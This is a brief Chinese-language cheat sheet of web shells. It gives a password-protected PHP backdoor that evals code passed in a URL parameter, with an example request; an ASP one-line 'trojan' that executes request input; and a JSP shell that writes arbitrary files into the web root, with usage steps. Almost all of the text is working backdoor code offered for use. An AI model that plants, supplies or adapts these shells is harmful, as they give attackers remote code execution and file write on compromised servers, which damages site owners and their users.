### php
使用方法
http://xxx.xxxx.xxx/xxxx.php?pwd=admin&action=eval&a=phpinfo();
<?php
　　$passwd="admin";if($_GET['pwd']!=$passwd)exit;
　　if($_GET['action']=="eval" && $_GET['a']){eval($_GET['a']);}
?>

### asp一句话木马
<%execute request("value")%>

### jsp
<% if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%>

保存为1.jsp

提交url为 http://localhost/1.jsp?f=1.txt&;t=hello

访问http://localhost/1.txt 出来hello

https://www.jianshu.com/p/123db17b78a0
